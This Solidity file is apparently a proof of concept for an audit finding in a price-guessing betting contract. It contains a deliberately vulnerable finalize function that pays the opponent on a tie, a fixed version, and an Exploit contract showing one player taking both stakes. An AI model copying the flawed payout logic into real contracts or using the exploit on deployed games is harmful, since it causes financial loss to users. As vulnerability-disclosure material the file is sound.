// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Xyro OneVsOneExactPrice — Zokyo, 2024-08-29.
    When both guesses are the same distance from the settlement price, the
    else branch pays the opponent. Final price 100, initiator 90, opponent 110.
    The initiator's 10 ETH stake is paid to the opponent. A tie refunds both.
*/

contract Stake {
    string public symbol = "ETH";
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function approveFor(address owner, address spender, uint256 amount) external {
        allowance[owner][spender] = amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract Treasury {
    Stake public stake;

    constructor(Stake s) {
        stake = s;
    }

    function distribute(uint256 amount, address winner, uint256, uint256 fee) external {
        require(stake.transfer(winner, amount - fee), "pay");
    }
}

contract OneVsOneExactPrice {
    struct Game {
        address initiator;
        address opponent;
        uint256 initiatorPrice;
        uint256 opponentPrice;
        uint256 depositAmount;
        uint256 fee;
    }

    Stake public stake;
    Treasury public treasury;
    Game public game;

    constructor(Stake s, Treasury t) {
        stake = s;
        treasury = t;
    }

    function createGame(
        address initiator,
        address opponent,
        uint256 initiatorPrice,
        uint256 opponentPrice,
        uint256 depositAmount
    ) external {
        require(initiatorPrice != opponentPrice, "same price");
        require(stake.transferFrom(initiator, address(treasury), depositAmount), "init");
        require(stake.transferFrom(opponent, address(treasury), depositAmount), "opp");
        game = Game({
            initiator: initiator,
            opponent: opponent,
            initiatorPrice: initiatorPrice,
            opponentPrice: opponentPrice,
            depositAmount: depositAmount,
            fee: 0
        });
    }

    function finalize(uint256 finalPrice) external {
        Game memory g = game;
        uint256 diff1 = g.initiatorPrice > uint192(finalPrice) / 1e14
            ? g.initiatorPrice - uint192(finalPrice) / 1e14
            : uint192(finalPrice) / 1e14 - g.initiatorPrice;
        uint256 diff2 = g.opponentPrice > uint192(finalPrice) / 1e14
            ? g.opponentPrice - uint192(finalPrice) / 1e14
            : uint192(finalPrice) / 1e14 - g.opponentPrice;
        if (diff1 < diff2) {
            treasury.distribute(g.depositAmount * 2, g.initiator, g.depositAmount, g.fee);
        } else {
            // @> VULN: a tie (diff1 == diff2) pays the opponent instead of refunding both stakes
            treasury.distribute(g.depositAmount * 2, g.opponent, g.depositAmount, g.fee);
        }
    }
}

contract OneVsOneExactPriceFixed {
    struct Game {
        address initiator;
        address opponent;
        uint256 initiatorPrice;
        uint256 opponentPrice;
        uint256 depositAmount;
    }

    Stake public stake;
    Treasury public treasury;
    Game public game;

    constructor(Stake s, Treasury t) {
        stake = s;
        treasury = t;
    }

    function createGame(
        address initiator,
        address opponent,
        uint256 initiatorPrice,
        uint256 opponentPrice,
        uint256 depositAmount
    ) external {
        require(initiatorPrice != opponentPrice, "same price");
        require(stake.transferFrom(initiator, address(treasury), depositAmount), "init");
        require(stake.transferFrom(opponent, address(treasury), depositAmount), "opp");
        game = Game(initiator, opponent, initiatorPrice, opponentPrice, depositAmount);
    }

    function finalize(uint256 finalPrice) external {
        Game memory g = game;
        uint256 mark = uint192(finalPrice) / 1e14;
        uint256 diff1 = g.initiatorPrice > mark ? g.initiatorPrice - mark : mark - g.initiatorPrice;
        uint256 diff2 = g.opponentPrice > mark ? g.opponentPrice - mark : mark - g.opponentPrice;
        if (diff1 == diff2) {
            treasury.distribute(g.depositAmount, g.initiator, g.depositAmount, 0);
            treasury.distribute(g.depositAmount, g.opponent, g.depositAmount, 0);
        } else if (diff1 < diff2) {
            treasury.distribute(g.depositAmount * 2, g.initiator, g.depositAmount, 0);
        } else {
            treasury.distribute(g.depositAmount * 2, g.opponent, g.depositAmount, 0);
        }
    }
}

contract Exploit {
    uint256 public constant STAKE_AMT = 10 ether;
    uint256 public constant FINAL_PRICE = 100 * 1e14;

    Stake public stake;
    Treasury public treasury;
    OneVsOneExactPrice public game;
    address public initiator;
    uint256 public opponentBalance;
    uint256 public initiatorBalance;

    constructor() {
        stake = new Stake();
        treasury = new Treasury(stake);
        game = new OneVsOneExactPrice(stake, treasury);
        initiator = address(0x111A);
        stake.mint(initiator, STAKE_AMT);
        stake.mint(address(this), STAKE_AMT);
    }

    function run() external {
        stake.approve(address(game), STAKE_AMT);
        stake.approveFor(initiator, address(game), STAKE_AMT);
        game.createGame(initiator, address(this), 90, 110, STAKE_AMT);
        uint256 mark = uint192(FINAL_PRICE) / 1e14;
        require(mark - 90 == 110 - mark, "equal distance");
        game.finalize(FINAL_PRICE);
        opponentBalance = stake.balanceOf(address(this));
        initiatorBalance = stake.balanceOf(initiator);
        require(opponentBalance == 20 ether, "opponent takes both stakes");
        require(initiatorBalance == 0, "initiator stake is gone");
        require(stake.balanceOf(address(treasury)) == 0, "treasury emptied");
    }
}
